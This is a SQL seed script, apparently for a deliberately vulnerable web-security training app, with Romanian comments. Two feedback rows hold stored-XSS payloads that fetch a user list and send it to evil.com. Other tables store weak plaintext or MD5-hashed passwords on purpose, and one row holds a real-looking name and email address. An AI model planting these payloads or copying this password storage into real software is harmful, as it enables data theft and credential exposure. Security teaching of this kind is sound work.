-- Creare tabel `feedback`
CREATE TABLE IF NOT EXISTS feedback (
    id SERIAL PRIMARY KEY,
    name VARCHAR(255) NOT NULL,
    message TEXT NOT NULL
);

-- Inserare date de test (inclusiv payload-uri malitioase)
INSERT INTO feedback (name, message) VALUES 
    ('John Doe', 'Great platform, very easy to use!'),
    ('Alice Smith', 'I love the new features, keep up the good work.'),
    ('Bob Johnson', 'Had a small issue, but support was very helpful.'),
    ('Charlie Brown', E'<img src="x" onerror="setTimeout(() => {fetch(\'http://localhost:8080/api/bac/users\').then(res => res.text()).then(data => { new Image().src=\'http://evil.com/leak?data=\'+encodeURIComponent(data); });}, 1000);"> Best website!'),
    ('Emily Davis', 'The UI is very clean and easy to navigate.'),
    ('Grace Miller', 'Super intuitive interface, highly recommended.'),
    ('Henry Adams', E'<iframe src="javascript:setTimeout(() => {fetch(\'http://localhost:8080/api/bac/users\').then(res => res.text()).then(data => { new Image().src=\'http://evil.com/leak?data=\'+encodeURIComponent(data); });}, 1000);"></iframe> Loads fast, no issues.'),
    ('Mia White', 'Mobile version is fantastic, very responsive.'),
    ('Evil Hacker', E'<a href="#" onclick="alert(\'Hacked!\')">Amazing product!</a>');

-- Creare tabel `ba_users`
CREATE TABLE IF NOT EXISTS ba_users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(255) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL -- ❌ Parole în clar
);

-- Inserare date pentru `ba_users`
INSERT INTO ba_users (username, password) VALUES
('admin', '1234'), 
('user1', 'password'), 
('user2', '123456'), 
('hacker', 'letmein'), 
('guest', 'guest'), 
('test', 'test123'), 
('root', 'toor'), 
('developer', 'devpass'), 
('security', 'secureme'), 
('pentester', 'qwerty');

-- Creare tabel `bac_users`
CREATE TABLE IF NOT EXISTS bac_users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(255) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    role VARCHAR(50) NOT NULL -- Poate fi 'USER' sau 'ADMIN'
);

-- Inserare date pentru `bac_users`
INSERT INTO bac_users (username, password, role) VALUES
('user1', 'password123', 'USER'),
('user2', 'qwerty', 'USER'),
('admin1', 'adminpass', 'ADMIN'),
('admin2', 'root123', 'ADMIN');

-- Creare tabel `cf_users`
CREATE TABLE IF NOT EXISTS cf_users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(255) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,  -- Stocăm parola în format MD5 (nesigur)
    email VARCHAR(255) NOT NULL
);

INSERT INTO cf_users (username, password, email) VALUES
('lorinspan', 'fac0ca33fa0b047f25b1b8b894dee2d6', 'lorinspanx@gmail.com')
